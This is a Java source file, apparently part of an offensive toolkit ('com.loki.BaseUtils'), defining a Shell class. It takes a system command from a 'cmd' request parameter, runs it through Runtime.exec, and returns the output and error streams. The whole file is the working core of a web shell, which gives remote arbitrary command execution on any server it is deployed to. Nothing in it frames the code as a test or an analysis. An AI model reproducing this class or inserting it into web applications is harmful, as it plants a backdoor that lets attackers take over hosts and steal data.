package com.loki.BaseUtils;

import java.io.BufferedReader;
import java.io.InputStreamReader;

public class Shell {
    public static String help() {
        return "Usage: Provide a system command via the 'cmd' parameter.\nExample: ?cmd=ls -la";
    }

    public static String execute(String cmd) {
        StringBuilder output = new StringBuilder();
        try {
            Process process = Runtime.getRuntime().exec(cmd);

            // 读取命令执行的标准输出
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            // 同时读取错误输出（可选）
            BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
            while ((line = errorReader.readLine()) != null) {
                output.append(line).append("\n");
            }
            process.waitFor();
        } catch (Exception e) {
            return "Error executing command: " + e.getMessage();
        }
        return output.toString();
    }
}
